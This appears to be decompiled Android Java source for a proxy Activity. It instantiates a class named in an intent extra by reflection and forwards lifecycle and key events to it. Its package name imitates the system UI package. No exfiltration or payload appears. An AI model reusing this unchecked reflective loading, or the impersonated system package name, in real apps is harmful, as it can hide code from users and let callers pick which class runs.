package com.android.systemui.assis.main;

import android.app.Activity;
import android.content.res.Configuration;
import android.os.Bundle;
import android.view.KeyEvent;
import com.android.systemui.assis.app.LOG;

public class ProxyActivity extends Activity {
    private Class<?> cla;
    private Object object;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            this.cla = Class.forName(getIntent().getStringExtra("class_name"));
            this.object = this.cla.getConstructor(new Class[]{Activity.class}).newInstance(new Object[]{this});
            invoke("onCreate", Bundle.class, (Object) savedInstanceState);
        } catch (Exception e) {
            LOG.E(getPackageName(), "[载体]初始化窗口失败");
            finish();
        }
    }

    protected void onRestart() {
        super.onRestart();
        invoke("onRestart");
    }

    protected void onStart() {
        super.onStart();
        invoke("onStart");
    }

    protected void onResume() {
        super.onResume();
        invoke("onResume");
    }

    protected void onPause() {
        super.onPause();
        invoke("onPause");
    }

    protected void onStop() {
        super.onStop();
        invoke("onStop");
    }

    protected void onDestroy() {
        super.onDestroy();
        invoke("onDestroy");
    }

    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        invoke("onConfigurationChanged", Configuration.class, (Object) newConfig);
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        Object obj = invoke("onKeyDown", new Class[]{Integer.TYPE, KeyEvent.class}, new Object[]{Integer.valueOf(keyCode), event});
        if (obj != null && (obj instanceof Boolean)) {
            return ((Boolean) obj).booleanValue();
        }
        return super.onKeyDown(keyCode, event);
    }

    private void invoke(String name) {
        if (!(this.cla == null || this.object == null)) {
            try {
                this.cla.getMethod(name, new Class[0]).invoke(this.object, new Object[0]);
                return;
            } catch (Exception e) {
            }
        }
        finish();
    }

    private void invoke(String name, Class<?> argClass, Object argObj) {
        if (!(this.cla == null || this.object == null)) {
            try {
                this.cla.getMethod(name, new Class[]{argClass}).invoke(this.object, new Object[]{argObj});
                return;
            } catch (Exception e) {
            }
        }
        finish();
    }

    private Object invoke(String name, Class<?>[] argClass, Object[] argObj) {
        if (!(this.cla == null || this.object == null)) {
            try {
                return this.cla.getMethod(name, argClass).invoke(this.object, argObj);
            } catch (Exception e) {
            }
        }
        finish();
        return null;
    }
}
